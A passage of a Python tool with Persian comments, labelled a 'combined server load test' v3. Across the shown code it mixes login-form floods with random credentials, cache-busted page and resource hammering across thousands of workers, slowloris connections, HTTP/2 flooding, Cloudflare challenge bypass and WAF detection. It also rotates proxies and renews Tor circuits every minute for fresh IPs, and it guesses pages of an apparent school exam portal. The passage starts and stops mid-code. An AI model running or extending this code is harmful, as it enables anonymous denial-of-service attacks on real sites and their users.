                        for var_name, field_name in step['extract'].items():
                            match = re.search(fr'name=["\']?{re.escape(field_name)}["\']?[^>]*value=["\']?([^>"\'\s]+)', body)
                            if match:
                                self.variables[var_name] = match.group(1)

                    # بررسی انتظار
                    expect = step.get('expect', [])
                    if expect and resp.status not in expect:
                        return False, f"Expected {expect}, got {resp.status}", elapsed
                    return True, f"GET {resp.status}", elapsed

            elif action == 'post':
                data = self._resolve_dict(step.get('data', {}))
                headers = {
                    'User-Agent': random_ua(),
                    'Content-Type': step.get('content_type', 'application/x-www-form-urlencoded'),
                    'Referer': url,
                    'Origin': base_url,
                    'Connection': 'keep-alive',
                }
                async with session.post(url, headers=headers, data=data,
                                        ssl=False, allow_redirects=False) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t

                    expect = step.get('expect', [])
                    if expect and resp.status not in expect:
                        return False, f"Expected {expect}, got {resp.status}", elapsed
                    return True, f"POST {resp.status}", elapsed

            elif action == 'sleep':
                ms = step.get('ms', 100)
                await asyncio.sleep(ms / 1000)
                return True, f"Sleep {ms}ms", 0

            elif action == 'slowloris':
                headers = {'User-Agent': random_ua(), 'Connection': 'keep-alive'}
                try:
                    async with session.get(url, headers=headers, ssl=False,
                                           timeout=aiohttp.ClientTimeout(total=30),
                                           allow_redirects=False) as resp:
                        await asyncio.sleep(random.uniform(5, 15))
                        elapsed = time.time() - t
                        return True, f"Slowloris {elapsed:.1f}s", elapsed
                except asyncio.TimeoutError:
                    elapsed = time.time() - t
                    return True, f"Slowloris timeout {elapsed:.1f}s", elapsed

        except Exception as e:
            elapsed = time.time() - t
            return False, type(e).__name__, elapsed

        return False, "Unknown action", 0

    async def run_loop(self, session, stats_callback=None):
        """اجرای حلقه اسکریپت"""
        steps = self.script.get('steps', [])
        loop = self.script.get('loop', True)
        delay_ms = self.script.get('delay_ms', 10)
        stop_event = asyncio.Event()

        while not stop_event.is_set():
            for step in steps:
                ok, hint, rt = await self.execute_step(session, step)
                if stats_callback:
                    stats_callback(ok, hint, rt, 'script')
                await asyncio.sleep(delay_ms / 1000)
            if not loop:
                break


# ═══════════════════════════════════════════════════════════════════════════════
# 🔧 ماژول ۵: Proxy & Tor
# ═══════════════════════════════════════════════════════════════════════════════

class ProxyManager:
    """مدیریت لیست پروکسی و چرخش بین اونا"""

    def __init__(self, proxy_file: Optional[str] = None, tor_enabled: bool = False):
        self.proxies: List[str] = []
        self.tor_enabled = tor_enabled
        self.tor_port = 9050
        self.tor_control_port = 9051
        self.current_index = 0

        if proxy_file:
            self._load_proxy_file(proxy_file)

        if tor_enabled:
            self.proxies.insert(0, f'socks5://127.0.0.1:{self.tor_port}')
            print(f"  {C.CY}🧅 Tor فعال شد (SOCKS5://127.0.0.1:{self.tor_port}){C.RS}")

        if self.proxies:
            print(f"  {C.G}🔄 {len(self.proxies)} پروکسی بارگذاری شد{C.RS}")

    def _load_proxy_file(self, filepath: str):
        """بارگذاری لیست پروکسی از فایل
        
        فرمت هر خط: protocol://host:port یا host:port
        مثال:
          socks5://1.2.3.4:1080
          http://5.6.7.8:8080
          9.10.11.12:3128
        """
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if '://' not in line:
                        line = f'http://{line}'
                    self.proxies.append(line)
        except FileNotFoundError:
            print(f"  {C.R}❌ فایل پروکسی یافت نشد: {filepath}{C.RS}")

    def get_proxy(self) -> Optional[str]:
        """دریافت پروکسی بعدی (چرخشی)"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        return proxy

    def get_random_proxy(self) -> Optional[str]:
        """دریافت پروکسی تصادفی"""
        if not self.proxies:
            return None
        return random.choice(self.proxies)

    async def renew_tor_circuit(self):
        """🔥 جدید: تغییر مدار Tor (IP جدید)"""
        if not self.tor_enabled:
            return False
        try:
            # ارسال SIGNAL NEWNYM به Tor Control Port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(('127.0.0.1', self.tor_control_port))
            sock.send(b'AUTHENTICATE ""\r\n')
            resp = sock.recv(1024)
            if b'250' in resp:
                sock.send(b'SIGNAL NEWNYM\r\n')
                resp = sock.recv(1024)
                if b'250' in resp:
                    print(f"  {C.G}🧅 Tor: مدار جدید! IP تغییر کرد{C.RS}")
                    await asyncio.sleep(3)  # صبر برای برقراری مدار جدید
                    sock.close()
                    return True
            sock.close()
        except Exception:
            pass
        return False

    def create_connector(self, proxy: Optional[str] = None) -> Optional[Any]:
        """ساخت aiohttp Connector با پروکسی"""
        proxy_url = proxy or self.get_random_proxy()
        if not proxy_url:
            return None

        if proxy_url.startswith('socks'):
            if HAS_AIOHTTP_SOCKS:
                proxy_type_str = proxy_url.split('://')[0]
                parsed = urlparse(proxy_url)
                proxy_type = ProxyType.SOCKS5 if 'socks5' in proxy_type_str else ProxyType.SOCKS4
                return ProxyConnector(
                    proxy_type=proxy_type,
                    host=parsed.hostname,
                    port=parsed.port or 1080,
                )
        return None  # HTTP proxy در aiohttp مستقیم در session.get تنظیم می‌شه


# ═══════════════════════════════════════════════════════════════════════════════
# استخراج فیلدها و لینک‌ها (از v2)
# ═══════════════════════════════════════════════════════════════════════════════

def extract_form_fields(html: str) -> Dict[str, str]:
    fields = {}
    hidden_inputs = re.findall(r'<input[^>]*type=["\']?hidden["\']?[^>]*>', html, re.IGNORECASE)
    for inp in hidden_inputs:
        name_match = re.search(r'name=(["\']?)([^>"\'\s]+)\1', inp)
        value_match = re.search(r'value=(["\']?)([^>"\']*)\1', inp)
        if name_match:
            fields[name_match.group(2)] = value_match.group(2) if value_match else ""
    asp_inputs = re.findall(r'<input[^>]*name=(["\']?)(__[^>"\'\s]+)\1[^>]*value=(["\']?)([^>"\']*)\3[^>]*>', html)
    asp_inputs_rev = re.findall(r'<input[^>]*value=(["\']?)([^>"\']*)\1[^>]*name=(["\']?)(__[^>"\'\s]+)\3[^>]*>', html)
    for m in asp_inputs:
        name, value = m[1], m[3]
        if name not in fields: fields[name] = value
    for m in asp_inputs_rev:
        value, name = m[1], m[3]
        if name not in fields: fields[name] = value
    return fields


def detect_login_fields(html: str) -> Tuple[str, str, str]:
    username_field = "username"
    password_field = "password"
    login_button = ""
    patterns_user = [
        r'name=(["\']?)ctl00[^>"\']*[Uu]ser[^>"\']*\1', r'name=(["\']?)txtUserName\1',
        r'name=(["\']?)txtUsername\1', r'name=(["\']?)txtUser\1',
        r'name=(["\']?)UserName\1', r'name=(["\']?)username\1',
        r'name=(["\']?)email\1', r'name=(["\']?)txtEmail\1',
    ]
    patterns_pass = [
        r'name=(["\']?)ctl00[^>"\']*[Pp]ass[^>"\']*\1', r'name=(["\']?)txtPassword\1',
        r'name=(["\']?)txtPass\1', r'name=(["\']?)Password\1',
        r'name=(["\']?)password\1', r'name=(["\']?)txtPwd\1',
    ]
    patterns_btn = [
        r'name=(["\']?)ctl00[^>"\']*[Bb]tn[^>"\']*[Ll]ogin[^>"\']*\1',
        r'name=(["\']?)ctl00[^>"\']*[Bb]tn[^>"\']*\1',
        r'name=(["\']?)btnLogin\1', r'name=(["\']?)Button1\1',
        r'name=(["\']?)btnSubmit\1', r'name=(["\']?)Submit\1',
    ]
    for p in patterns_user:
        m = re.search(p, html)
        if m:
            nm = re.search(r'name=(["\']?)([^>"\'\s]+)\1', m.group(0))
            if nm: username_field = nm.group(2)
            break
    for p in patterns_pass:
        m = re.search(p, html)
        if m:
            nm = re.search(r'name=(["\']?)([^>"\'\s]+)\1', m.group(0))
            if nm: password_field = nm.group(2)
            break
    for p in patterns_btn:
        m = re.search(p, html)
        if m:
            nm = re.search(r'name=(["\']?)([^>"\'\s]+)\1', m.group(0))
            if nm: login_button = nm.group(2)
            break
    return username_field, password_field, login_button


def extract_links(html: str, base_url: str) -> Set[str]:
    links = set()
    parsed_base = urlparse(base_url)
    domain = parsed_base.netloc
    for m in re.finditer(r'href=["\']([^"\']+)["\']', html, re.IGNORECASE):
        link = m.group(1)
        if link.startswith(('javascript:', 'mailto:', 'tel:', '#', 'data:')): continue
        if link.startswith('/'):
            link = f"{parsed_base.scheme}://{domain}{link}"
        elif not link.startswith('http'):
            link = urljoin(base_url, link)
        link_parsed = urlparse(link)
        if link_parsed.netloc == domain:
            links.add(link.split('#')[0])
    for m in re.finditer(r'src=["\']([^"\']+)["\']', html, re.IGNORECASE):
        link = m.group(1)
        if link.startswith(('javascript:', 'data:', '#')): continue
        if link.startswith('/'):
            link = f"{parsed_base.scheme}://{domain}{link}"
        elif not link.startswith('http'):
            link = urljoin(base_url, link)
        link_parsed = urlparse(link)
        if link_parsed.netloc == domain:
            links.add(link.split('#')[0])
    return links


# ═══════════════════════════════════════════════════════════════════════════════
# Data Classes
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class HitResult:
    ok: bool
    code: Optional[int]
    rt: float
    mode: str = ""
    err: Optional[str] = None
    hint: str = ""
    ts: float = field(default_factory=time.time)
    url: str = ""

@dataclass
class Stats:
    total: int = 0
    ok: int = 0
    fail: int = 0
    rate_limited: int = 0
    captcha: int = 0
    locked: int = 0
    login_ok: int = 0
    login_fail: int = 0
    page_hits: int = 0
    resource_hits: int = 0
    slowloris_hits: int = 0
    script_hits: int = 0
    cf_solved: int = 0
    rts: deque = field(default_factory=lambda: deque(maxlen=50000))
    codes: Dict[int, int] = field(default_factory=dict)
    hints: Dict[str, int] = field(default_factory=dict)
    errs: deque = field(default_factory=lambda: deque(maxlen=1000))
    t0: float = 0
    t1: float = 0
    users: int = 0
    _recent: deque = field(default_factory=lambda: deque(maxlen=5000))
    first_rl_at: int = 0
    first_cap_at: int = 0
    first_lock_at: int = 0

    @property
    def dur(self):
        return (self.t1 if self.t1 > self.t0 else time.time()) - self.t0 if self.t0 else 0
    @property
    def rps(self):
        return self.total / self.dur if self.dur > 0 else 0
    @property
    def rrps(self):
        now = time.time()
        r = [x for x in self._recent if now - x.ts < 5]
        return len(r) / 5 if r else 0
    @property
    def art(self):
        return statistics.mean(self.rts) if self.rts else 0
    @property
    def rart(self):
        now = time.time()
        r = [x.rt for x in self._recent if now - x.ts < 5]
        return statistics.mean(r) if r else 0


# ═══════════════════════════════════════════════════════════════════════════════
# 🏛️ Engine اصلی — v3
# ═══════════════════════════════════════════════════════════════════════════════

class CombinedTester:
    def __init__(self, login_url: str, timeout: int = 20, safe_max: int = 3000,
                 enable_slowloris: bool = False, enable_cfb: bool = False,
                 enable_http2: bool = False, tor_enabled: bool = False,
                 proxy_file: Optional[str] = None, script_path: Optional[str] = None):
        self.login_url = login_url
        parsed = urlparse(login_url)
        self.site_root = f"{parsed.scheme}://{parsed.netloc}"
        self.base_url = parsed.scheme + "://" + parsed.netloc + parsed.path.rsplit('/', 1)[0]
        self.target_host = parsed.hostname
        self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)

        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.stats = Stats()
        self._stop = asyncio.Event()
        self._snaps: List[dict] = []
        self.safe_max = safe_max

        self.username_field = "username"
        self.password_field = "password"
        self.login_button = ""
        self.detected = False
        self.discovered_pages: List[str] = []
        self.discovered_resources: List[str] = []
        self.guessed_pages: List[str] = []
        self._viewstate_cache: Dict[str, str] = {}
        self._viewstate_ts: float = 0
        self._viewstate_ttl: float = 30.0
        self.page_weights: Dict[str, float] = {}
        self.resource_weights: Dict[str, float] = {}
        self.peak_workers = 0
        self.ceiling_workers = 0
        self.limit_hit = False
        self.detected_waf: Optional[str] = None

        # ویژگی‌های جدید v3
        self.enable_slowloris = enable_slowloris
        self.enable_cfb = enable_cfb
        self.enable_http2 = enable_http2 and HAS_HTTPX
        self.cf_bypass = CloudflareBypass() if enable_cfb else None
        self.proxy_manager = ProxyManager(proxy_file, tor_enabled) if (proxy_file or tor_enabled) else None
        self.script_engine = ScriptEngine(script_path) if script_path else None

        # تست اتصال Tor
        if tor_enabled:
            self._check_tor()

    def _check_tor(self):
        """بررسی اتصال Tor"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect(('127.0.0.1', 9050))
            sock.close()
            print(f"  {C.G}🧅 Tor: اتصال برقرار{C.RS}")
        except Exception:
            print(f"  {C.Y}⚠ Tor در پورت 9050 قابل دسترسی نیست!{C.RS}")
            print(f"     مطمئن شو Tor Browser یا tor daemon اجراست")

    def stop(self):
        self._stop.set()

    def _base_headers(self) -> Dict[str, str]:
        return {
            "User-Agent": random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Connection": "keep-alive",
        }

    async def _fetch_page(self, session, url=None):
        headers = self._base_headers()
        try:
            async with session.get(url or self.login_url, headers=headers, ssl=False, allow_redirects=True) as resp:
                return await resp.text()
        except Exception:
            return None

    async def _detect_waf(self, session):
        headers = self._base_headers()
        try:
            async with session.get(self.site_root, headers=headers, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=10), allow_redirects=True) as resp:
                server = resp.headers.get('Server', '').lower()
                cf_ray = resp.headers.get('CF-Ray', '')
                if cf_ray:
                    self.detected_waf = "cloudflare"
                    print(f"  {C.R}⚠ Cloudflare شناسایی شد!{C.RS}")
                elif 'arvan' in server:
                    self.detected_waf = "arvan"
                    print(f"  {C.R}⚠ ArvanCloud شناسایی شد!{C.RS}")
                elif 'iis' in server:
                    self.detected_waf = "iis"
                elif 'nginx' in server:
                    self.detected_waf = "nginx"
        except Exception:
            pass

    async def _detect_and_discover(self, session):
        print(f"\n  {C.CY}🔍 بررسی و کشف سایت...{C.RS}")
        await self._detect_waf(session)

        html = await self._fetch_page(session)
        if not html:
            print(f"  {C.R}❌ صفحه دریافت نشد{C.RS}")
            return False

        # 🛡️ CFB: بررسی چالش Cloudflare
        if self.cf_bypass:
            # تست اولیه با session معمولی
            try:
                async with session.get(self.login_url, headers=self._base_headers(), ssl=False,
                                       allow_redirects=True) as resp:
                    body = await resp.text()
                    if self.cf_bypass.is_cf_challenge(resp.status, body, dict(resp.headers)):
                        print(f"  {C.Y}🛡️ Cloudflare Challenge شناسایی شد! حل می‌کنیم...{C.RS}")
                        cookies = await self.cf_bypass.solve_challenge(session, self.login_url, body, dict(resp.headers))
                        if cookies:
                            print(f"  {C.G}✅ Cloudflare Bypass موفق!{C.RS}")
                            self.stats.cf_solved += 1
                            # درخواست مجدد با کوکی
                            html = await self._fetch_page(session)
                        else:
                            print(f"  {C.R}❌ Cloudflare Bypass ناموفق!{C.RS}")
            except Exception:
                pass

        if not html:
            return False

        self.username_field, self.password_field, self.login_button = detect_login_fields(html)
        asp_fields = extract_form_fields(html)
        self._viewstate_cache = asp_fields
        self._viewstate_ts = time.time()

        print(f"  {C.G}✅ صفحه لاگین ({len(html):,}B){C.RS}")
        print(f"  📝 کاربر: {C.BD}{self.username_field}{C.RS}")
        print(f"  🔑 رمز:   {C.BD}{self.password_field}{C.RS}")
        if self.login_button:
            print(f"  🔘 دکمه:  {C.BD}{self.login_button}{C.RS}")

        links = extract_links(html, self.site_root)
        for link in links:
            ext = link.rsplit('.', 1)[-1].lower() if '.' in link.split('?')[0].rsplit('/', 1)[-1] else ''
            if ext in ('jpg','jpeg','png','gif','svg','ico','webp','bmp','css','js','woff','woff2','ttf','eot','pdf','zip'):
                self.discovered_resources.append(link)
            elif ext in ('aspx','html','htm','php','') or '?' in link:
                self.discovered_pages.append(link)

        common_pages = [
            "/Default.aspx","/FirstPages/Student.aspx","/FirstPages/Teacher.aspx",
            "/FirstPages/Admin.aspx","/FirstPages/Default.aspx","/FirstPages/Home.aspx",
            "/Admin/Default.aspx","/Admin/Login.aspx","/api/","/handler.ashx",
            "/WebService.asmx","/FirstPages/StudentRegister.aspx",
            "/FirstPages/ExamResult.aspx","/api/students","/api/exams",
        ]
        for page in common_pages:
            full_url = self.site_root + page
            if full_url not in self.discovered_pages:
                self.guessed_pages.append(full_url)

        common_resources = [
            "/Content/Images/logo.png","/Scripts/jquery.js","/Content/Site.css",
            "/favicon.ico","/Scripts/bootstrap.js","/Content/bootstrap.css",
        ]
        for res in common_resources:
            full_url = self.site_root + res
            if full_url not in self.discovered_resources:
                self.discovered_resources.append(full_url)

        print(f"  📄 صفحات: {len(self.discovered_pages)} + {len(self.guessed_pages)} حدسی")
        print(f"  🖼️ منابع: {len(self.discovered_resources)}")
        self.detected = True
        return True

    async def _refresh_viewstate(self, session):
        now = time.time()
        if now - self._viewstate_ts > self._viewstate_ttl or not self._viewstate_cache:
            try:
                async with session.get(self.login_url, headers=self._base_headers(), ssl=False, allow_redirects=True) as resp:
                    html = await resp.text()
                    self._viewstate_cache = extract_form_fields(html)
                    self._viewstate_ts = now
            except Exception:
                pass
        return dict(self._viewstate_cache)

    def _select_weighted_page(self, pages):
        if not self.page_weights or not pages:
            return random.choice(pages) if pages else self.login_url
        weights = [max(self.page_weights.get(p, 1.0), 0.1) for p in pages]
        try:
            return random.choices(pages, weights=weights, k=1)[0]
        except Exception:
            return random.choice(pages)

    async def _send_login(self, session):
        t = time.time()
        try:
            hidden_fields = await self._refresh_viewstate(session)
            form_data = {**hidden_fields, self.username_field: rand_user(), self.password_field: rand_pass()}
            if self.login_button:
                form_data[self.login_button] = "ورود"
            headers = {**self._base_headers(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": self.site_root, "Referer": self.login_url,
            }
            # 🔥 پروکسی
            proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
            async with session.post(self.login_url, headers=headers, data=form_data,
                                    ssl=False, allow_redirects=False, proxy=proxy) as resp:
                body = await resp.text()
                elapsed = time.time() - t

                # 🛡️ CFB بررسی
                if self.cf_bypass and self.cf_bypass.is_cf_challenge(resp.status, body, dict(resp.headers)):
                    cookies = await self.cf_bypass.solve_challenge(session, self.login_url, body, dict(resp.headers))
                    self.stats.cf_solved += (1 if cookies else 0)

                return HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                 mode="login", hint=self._analyze_response(resp.status, body), url=self.login_url)
        except asyncio.TimeoutError:
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err="Timeout")
        except aiohttp.ClientError as e:
            msg = str(e)
            if "Connection" in msg: msg = "ConnErr"
            elif "Cannot connect" in msg: msg = "NoConnect"
            elif "Buffer" in msg: msg = "BufFull"
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=msg)
        except Exception as e:
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=type(e).__name__)

    async def _hit_page(self, session, url):
        t = time.time()
        try:
            sep = '&' if '?' in url else '?'
            busted = f"{url}{sep}{rand_cache_bust()}"
            proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
            async with session.get(busted, headers=self._base_headers(), ssl=False,
                                   allow_redirects=True, proxy=proxy) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                size_kb = len(body) / 1024
                self.page_weights[url] = (self.page_weights.get(url, 1.0) * 0.7) + ((elapsed * 2 + size_kb / 100) * 0.3)
                return HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                 mode="page", hint=f"Page {resp.status} ({len(body):,}B)", url=url)
        except asyncio.TimeoutError:
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err="Timeout", url=url)
        except Exception as e:
            msg = type(e).__name__
            if "Buffer" in str(e): msg = "BufFull"
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err=msg, url=url)

    async def _hit_resource(self, session, url):
        t = time.time()
        try:
            headers = {"User-Agent": random_ua(), "Accept": "*/*", "Cache-Control": "no-cache", "Connection": "keep-alive"}
            sep = '&' if '?' in url else '?'
            busted = f"{url}{sep}{rand_cache_bust()}"
            proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
            async with session.get(busted, headers=headers, ssl=False, allow_redirects=True, proxy=proxy) as resp:
                data = await resp.read()
                elapsed = time.time() - t
                return HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                 mode="resource", hint=f"Res {resp.status} ({len(data):,}B)", url=url)
        except Exception as e:
            msg = type(e).__name__
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="resource", err=msg, url=url)

    async def _slowloris(self, session):
        t = time.time()
        try:
            headers = self._base_headers()
            headers["Content-Length"] = str(random.randint(10000, 100000))
            proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
            async with session.get(self.login_url, headers=headers, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=30), allow_redirects=False, proxy=proxy) as resp:
                await asyncio.sleep(random.uniform(5, 15))
                elapsed = time.time() - t
                return HitResult(ok=True, code=resp.status, rt=elapsed, mode="slowloris",
                                 hint=f"Slowloris {elapsed:.1f}s", url=self.login_url)
        except asyncio.TimeoutError:
            elapsed = time.time() - t
            return HitResult(ok=True, code=None, rt=elapsed, mode="slowloris",
                             hint=f"Slowloris timeout {elapsed:.1f}s", url=self.login_url)
        except Exception as e:
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="slowloris", err=type(e).__name__)

    def _analyze_response(self, status, body):
        body_lower = body.lower() if body else ''
        if status == 429: return "429 Rate Limited"
        elif status == 503: return "503 Unavailable"
        elif any(x in body_lower for x in ["rate limit", "too many"]): return "Rate limit"
        elif any(x in body_lower for x in ["captcha", "recaptcha"]): return "CAPTCHA"
        elif any(x in body_lower for x in ["locked", "too many attempts"]): return "Account locked"
        elif any(x in body_lower for x in ["welcome", "dashboard", "خوش آمدید"]): return "Login success!"
        elif status in (301, 302, 303, 307): return "Redirect"
        elif any(x in body_lower for x in ["invalid", "wrong", "نامعتبر"]): return "Invalid credentials"
        return f"Status {status}"

    def _record(self, r):
        self.stats.total += 1
        self.stats.rts.append(r.rt)
        self.stats._recent.append(r)
        if r.ok: self.stats.ok += 1
        else:
            self.stats.fail += 1
            if r.err: self.stats.errs.append(r.err)
        if r.code: self.stats.codes[r.code] = self.stats.codes.get(r.code, 0) + 1
        if r.hint: self.stats.hints[r.hint] = self.stats.hints.get(r.hint, 0) + 1
        if r.mode == "login":
            h = r.hint.lower()
            if "rate limit" in h or "429" in h or "503" in h:
                self.stats.rate_limited += 1
                if not self.stats.first_rl_at: self.stats.first_rl_at = self.stats.total
            elif "captcha" in h: self.stats.captcha += 1
            elif "locked" in h: self.stats.locked += 1
            elif "success" in h or "redirect" in h: self.stats.login_ok += 1
            else: self.stats.login_fail += 1
        elif r.mode == "page": self.stats.page_hits += 1
        elif r.mode == "resource": self.stats.resource_hits += 1
        elif r.mode == "slowloris": self.stats.slowloris_hits += 1
        elif r.mode == "script": self.stats.script_hits += 1

    def _get_target_urls(self):
        pages = list(self.discovered_pages) + list(self.guessed_pages)
        if not pages: pages = [self.site_root + "/Default.aspx", self.login_url]
        resources = list(self.discovered_resources)
        if not resources: resources = [self.site_root + "/favicon.ico"]
        return pages, resources

    async def _worker_login(self, session, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            result = await self._send_login(session)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(0.01)

    async def _worker_page(self, session, pages, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            url = self._select_weighted_page(pages)
            result = await self._hit_page(session, url)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(0.01)

    async def _worker_resource(self, session, resources, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            urls = random.sample(resources, min(3, len(resources)))
            for url in urls:
                if self._stop.is_set(): break
                result = await self._hit_resource(session, url)
                self._record(result)
                if not result.ok:
                    consecutive_fails += 1
                    await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
                else:
                    consecutive_fails = 0
            await asyncio.sleep(0.01)

    async def _worker_slowloris(self, session, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        while not self._stop.is_set():
            result = await self._slowloris(session)
            self._record(result)

    async def _worker_script(self, session, delay=0):
        """🔥 جدید: ورکر اسکریپت — اجرای اسکریپت سفارشی"""
        if delay > 0: await asyncio.sleep(delay)
        if not self.script_engine: return
        while not self._stop.is_set():
            steps = self.script_engine.script.get('steps', [])
            for step in steps:
                if self._stop.is_set(): break
                ok, hint, rt = await self.script_engine.execute_step(session, step)
                self._record(HitResult(ok=ok, code=None, rt=rt, mode="script", hint=hint))
                delay_ms = self.script_engine.script.get('delay_ms', 10)
                await asyncio.sleep(delay_ms / 1000)
            if not self.script_engine.script.get('loop', True):
                break

    async def _worker_http2(self, delay=0):
        """🔥 جدید: ورکر HTTP/2 با httpx"""
        if not HAS_HTTPX:
            return
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0

        async with httpx.AsyncClient(http2=True, verify=False, timeout=20) as client:
            while not self._stop.is_set():
                t = time.time()
                try:
                    url = self._select_weighted_page(self._get_target_urls()[0])
                    sep = '&' if '?' in url else '?'
                    busted = f"{url}{sep}{rand_cache_bust()}"
                    headers = self._base_headers()
                    proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None

                    resp = await client.get(busted, headers=headers, proxy=proxy)
                    elapsed = time.time() - t
                    self._record(HitResult(
                        ok=resp.status_code < 500,
                        code=resp.status_code,
                        rt=elapsed,
                        mode="page",
                        hint=f"H2 {resp.status_code} ({len(resp.content):,}B)",
                        url=url,
                    ))
                    consecutive_fails = 0
                    await asyncio.sleep(0.01)
                except Exception as e:
                    elapsed = time.time() - t
                    self._record(HitResult(ok=False, code=None, rt=elapsed, mode="page",
                                           err=type(e).__name__, url=url))
                    consecutive_fails += 1
                    await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))

    def _spawn_worker(self, session, all_tasks, login_pct, page_pct,
                      resource_pct, slowloris_pct, script_pct, http2_pct, pages, resources):
        r = random.random()
        delay = random.uniform(0, 2.0)

        if r < login_pct:
            t = asyncio.create_task(self._worker_login(session, delay=delay))
        elif r < login_pct + page_pct:
            t = asyncio.create_task(self._worker_page(session, pages, delay=delay))
        elif r < login_pct + page_pct + resource_pct:
            t = asyncio.create_task(self._worker_resource(session, resources, delay=delay))
        elif r < login_pct + page_pct + resource_pct + slowloris_pct:
            t = asyncio.create_task(self._worker_slowloris(session, delay=delay))
        elif r < login_pct + page_pct + resource_pct + slowloris_pct + script_pct:
            t = asyncio.create_task(self._worker_script(session, delay=delay))
        elif self.enable_http2:
            t = asyncio.create_task(self._worker_http2(delay=delay))
        else:
            t = asyncio.create_task(self._worker_page(session, pages, delay=delay))
        all_tasks.append(t)
        self.stats.t1 = time.time()

    async def run(self, max_workers=2000, step=100, step_dur=5):
        self.stats = Stats()
        self.stats.t0 = time.time()
        actual_max = min(max_workers, self.safe_max)

        connector = aiohttp.TCPConnector(
            limit=actual_max + 500,
            force_close=False,
            enable_cleanup_closed=True,
            ttl_dns_cache=30,
            keepalive_timeout=30,
        )

        async with aiohttp.ClientSession(connector=connector, timeout=self.timeout) as session:
            ok = await self._detect_and_discover(session)
            if not ok:
                print(f"  {C.R}❌ اتصال ناموفق{C.RS}")
                return

            pages, resources = self._get_target_urls()

            # توزیع ورکرها
            login_pct = 0.45
            page_pct = 0.25
            resource_pct = 0.15
            slowloris_pct = 0.05 if self.enable_slowloris else 0.0
            script_pct = 0.05 if self.script_engine else 0.0
            http2_pct = 0.05 if self.enable_http2 else 0.0
            remaining = 1.0 - login_pct - page_pct - resource_pct - slowloris_pct - script_pct - http2_pct
            if remaining > 0:
                page_pct += remaining  # اضافی به صفحه فلاد

            print(f"\n{'═'*72}")
            print(f"  {C.BD}{C.R}🔥 تست ترکیبی بار سرور v3 — Ultimate{C.RS}")
            print(f"{'═'*72}")
            print(f"  🎯 هدف:       {C.W}{self.login_url}{C.RS}")
            if self.detected_waf: print(f"  🛡️ WAF:        {C.Y}{self.detected_waf.upper()}{C.RS}")
            print(f"  👥 ورکر:       {C.BD}{actual_max:,}{C.RS}")
            print(f"  🔐 لاگین:      {int(actual_max*login_pct):,} ({int(login_pct*100)}%)")
            print(f"  📄 صفحه:       {int(actual_max*page_pct):,} ({int(page_pct*100):.0f}%)")
            print(f"  🖼️ منابع:      {int(actual_max*resource_pct):,} ({int(resource_pct*100)}%)")
            if self.enable_slowloris: print(f"  🐌 Slowloris:  {int(actual_max*slowloris_pct):,} (5%)")
            if self.script_engine: print(f"  📜 Script:     {int(actual_max*script_pct):,} (5%)")
            if self.enable_http2: print(f"  ⚡ HTTP/2:     {int(actual_max*http2_pct):,} (5%)")
            if self.enable_cfb: print(f"  🛡️ CFB:        {C.G}فعال{C.RS}")
            if self.proxy_manager: print(f"  🔄 پروکسی:     {C.G}{len(self.proxy_manager.proxies)} پروکسی{C.RS}")
            print(f"  📈 مراحل:      +{step} هر {step_dur}s")
            print(f"{'═'*72}\n")

            all_tasks = []
            cur = 0
            self.peak_workers = 0
            self.ceiling_workers = 0
            self.limit_hit = False

            # 🔥 رینو Tor هر ۶۰ ثانیه
            if self.proxy_manager and self.proxy_manager.tor_enabled:
                async def tor_renewer():
                    while not self._stop.is_set():
                        await asyncio.sleep(60)
                        await self.proxy_manager.renew_tor_circuit()
                asyncio.create_task(tor_renewer())

            while not self._stop.is_set():
                now = time.time()
